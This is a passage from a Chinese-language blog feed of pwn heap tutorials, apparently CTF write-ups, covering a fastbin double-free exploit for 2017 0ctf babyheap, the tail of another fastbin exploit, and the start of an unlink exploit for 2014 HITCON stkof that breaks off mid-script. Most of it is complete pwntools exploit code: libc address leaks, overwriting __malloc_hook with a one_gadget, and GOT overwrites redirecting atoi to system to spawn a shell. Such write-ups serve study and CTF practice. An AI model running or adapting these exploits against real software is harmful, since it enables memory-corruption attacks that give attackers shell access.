unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak libc base</span></span><br><span class="line">    unsortedbin_addr = leak_libc()</span><br><span class="line">    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena</span><br><span class="line">    libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'unsortedbin addr: '</span> + hex(unsortedbin_addr))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">    index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">    search_word(<span class="string">'d'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. fastbin attack to malloc_hook nearby chunk</span></span><br><span class="line">    fake_chunk_addr = main_arena_addr - <span class="number">0x33</span></span><br><span class="line">    fake_chunk = p64(fake_chunk_addr).ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(fake_chunk)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">fill</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = read_num();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = read_content(a1[v2].ptr, v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写任意长度，堆溢出，原来想unlink发觉没全局变量</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">free_chunk</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">      a1[v2].size = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">      result = (__int64)&amp;a1[v2];</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free后没有置空，存在double free</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>这道题我原来觉得很简单，后面自己做起来才发觉问题较多，不是难，而是细节性的问题比较多</li><li>大体思路是构造unsortbin泄露libc地址，然后通过覆盖malloc_hook成one_gadget拿到shell</li><li>细节点1：你会发觉这道题你没有全局变量，所以要在堆上做文章，通过连续free两个chunk，第一个free的chunk的fd会指向第二个</li><li>细节点2：要绕过fastbin的长度检测，所以要多次溢出修改size，这里我建议不要急着free，我自己做的时候先free就出错了</li><li>细节点3： idx问题， 要注意标记好idx，不然自己都不知道哪个对应哪个</li><li>具体在exp里在标注下注释就好了</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'babyheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'babyheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>)</span><br><span class="line">    Dump(<span class="number">0</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#test()</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#细节点1</span></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, len(payload), payload)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    Free(<span class="number">4</span>) </span><br><span class="line">    Dump(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> %malloc_hook)</span><br><span class="line">    one_gadget = <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = <span class="number">0x4526a</span> <span class="comment">#0xf02a4 0xf1147</span></span><br><span class="line">    one_gadget = one_gadget + libc_base </span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Free(<span class="number">4</span>)</span><br><span class="line">    payload = p64(ptr)</span><br><span class="line">    Fill(<span class="number">2</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">    Fill(<span class="number">6</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x20</span>) <span class="comment">#7</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>fastbin的题目相对来说不难，可能是因为前面有基础了的原因了吧，以后多做下题巩固下就好</li><li>double free也是常用的攻击手段</li><li>逆向还得多学习，像搜索引擎那题，看都看不懂题目，做什么题。。。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvZmFzdGJpbl9hdHRhY2stemgv" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/">ctf-wiki<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/1d71df53/">https://noone-hub.github.io/posts/1d71df53/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程4</title>
    <url>/posts/6a76efc5/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程4"><a href="#pwn堆入门系列教程4" class="headerlink" title="pwn堆入门系列教程4"></a>pwn堆入门系列教程4</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span></p><p>序言：这次进入到unlink的学习了，unlink在第一节已经用上了，但我用起来还不是很流畅，还是去翻了第一节的笔记，最主要是指针的问题，可能没学好指针，理解了unlink后就简单做了</p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>几乎无输出的题目</li><li>申请功能，申请指定大小size</li><li>删除功能，删除idx位置处的chunk</li><li>输出一些无用字符串，有个strlen，本来想用来做/bin/sh的，发觉也不行</li><li>编辑功能</li></ol><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fill函数里也就是编辑功能处可以自定大小编辑，也就是说存在堆溢出</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这里有个小细节，自己补充下知识，关于缓冲区的问题，这个细节也解决了我自己出pwn题的时候输出，为什么输出不了的问题<br>就是如果未设置缓冲区为0的话，这道题里是第一次调用fgets是要先申请1024大小的堆块作为缓冲区的，还有printf也要申请1024大小的堆块作为缓冲区</p><p><span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQ1MC8=" title="https://paper.seebug.org/450/">知道创宇讲解的一道题目<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解这部分知识<i class="fa fa-external-link"></i></span></p><ol><li>首先先申请一块内存，冲掉printf和fgets所需缓冲区</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#idx1</span></span><br></pre></td></tr></table></figure><ol start="2"><li>是unlink部分，当然用unlink方法来解了，第一节学过了，伪造一个chunk，然后通过溢出覆盖第二个堆块的pre_size和size，在free第二个堆块的时候就会unlink我们的伪造的p堆块</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x20f7560-0x30</span><br><span class="line">0x20f7530:	0x0000000000000000	0x0000000000000041 <span class="comment">#chunk2</span></span><br><span class="line">0x20f7540:	0x0000000000000000	0x0000000000000030 <span class="comment">#p</span></span><br><span class="line">0x20f7550:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f7560:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f7570:	0x0000000000000030	0x0000000000000090 <span class="comment">#chunk3</span></span><br><span class="line">0x20f7580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f7590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这里已经溢出覆盖掉chunk3的size了<br>其实unlink已经说过一次了，</p><ul><li>首先，第一步要过掉unlink的size检测，覆盖chunk3的pre_size为fake_chunk大小</li><li>其次chunk3的insue位要为0，标志前面一个堆块未在使用当中</li><li>然后关键点就是伪造fd跟bk了</li><li>在第一点中我将ptr设置为global+0x10意思就是第二块堆块地址，这就是存放p的地方</li><li>unlink第一步 FD = p-&gt;fd = ptr-0x18</li><li>unlink第二步 BK=p-&gt;bk = ptr-0x10</li><li>unlink第三步 判断FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p ?</li><li>过了检验后</li><li>FD-&gt;bk = * (ptr-0x18 + 0x18 )= BK = ptr -0x10</li><li>BK-&gt;fd = * (ptr-0x10+0x10) = FD = ptr-0x18<br>最终结果就是*ptr = ptr-0x18，而ptr是0x0000000000602150故最终就是将global+0x10处的值改为0x602138<br>然后我们在编辑第二块的时候实际上就是编辑0x602138处，也就是global-0x8处</li></ul><ol start="3"><li>泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got) <span class="comment">#这里对应的是第一块堆块，第二块，第三块和第四块</span></span><br><span class="line">fill(<span class="number">2</span>, payload) </span><br><span class="line">fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br></pre></td></tr></table></figure><p>没什么好说的啊，覆写got表为put泄露地址</p><ol start="4"><li>最后我修改atoi为system，因为输入的会经过atoi转换，所以输入的就是system参数</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'stkof'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'stkof'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_got = elf.got[<span 